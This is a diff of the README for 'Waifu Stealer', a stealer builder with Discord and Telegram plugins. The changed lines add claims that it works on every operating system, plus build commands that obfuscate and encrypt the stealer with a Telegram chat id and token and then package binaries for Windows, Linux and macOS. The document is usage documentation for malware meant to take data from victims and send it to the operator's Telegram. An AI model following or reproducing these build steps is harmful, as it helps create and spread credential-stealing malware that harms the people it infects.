@@ -1,6 +1,8 @@
 # Waifu Stealer
 
-Stealer builder with a powerful plugins system (Discord and Telegram plugins are provided).
+🗡️🟠 Stealer with a powerful plugin system (includes Discord and Telegram plugins)
+
+Works all operating systems, see [System compatibility](#system-compatibility).
 
 ## Features
 
@@ -165,10 +167,15 @@ npm install --dev
 
 ```sh
 # Obfuscate and encrypt the code
-npm run build --chatId=<telegram_chat_id> --token=<telegram_token> [--no-random-delays] [--disabled-plugins=<plugin1,plugin2,...>] [--debug]
+npm run -- build --chatId=<telegram_chat_id> --token=<telegram_token> [--no-random-delays] [--disabled-plugins=<plugin1,plugin2,...>] [--debug]
+# node builder.js [...]
 
-# Generate the binary
+# Generate the binary for the target system and architecture
 npm run pkg-windows
+npm run pkg-linux
+npm run pkg-linux-arm
+npm run pkg-macos
+npm run pkg-macos-arm
 ```
 
 ## Run
